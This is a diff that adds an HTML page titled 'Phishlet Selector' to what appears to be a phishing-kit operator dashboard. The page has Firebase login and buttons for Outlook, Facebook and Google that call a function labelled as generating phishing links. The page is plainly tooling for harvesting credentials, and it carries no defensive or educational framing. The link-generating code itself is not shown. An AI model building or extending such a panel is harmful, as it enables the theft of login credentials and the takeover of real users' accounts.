@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Dashboard 2 | Phishlet Selector</title>
+  <link rel="stylesheet" href="styles.css" />
+  <!-- Load Firebase compat SDKs and our scripts -->
+  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script defer src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+  <script defer src="firebase-config.js"></script>
+  <script defer src="script.js"></script>
+</head>
+<body>
+  <div class="sidebar">
+    <button class="menu-btn" onclick="generatePhishletLink('outlook')">Outlook</button>
+    <button class="menu-btn" onclick="generatePhishletLink('facebook')">Facebook</button>
+    <button class="menu-btn" onclick="generatePhishletLink('google')">Google</button>
+    <button class="menu-btn" onclick="window.location.href='dashboard.html'">Back to Dashboard</button>
+  </div>
+  
+  <div class="content">
+    <h2>Phishlet Selector</h2>
+    <p id="phishletLink">Select a phishlet to generate a phishing link.</p>
+  </div>
+</body>
+</html>
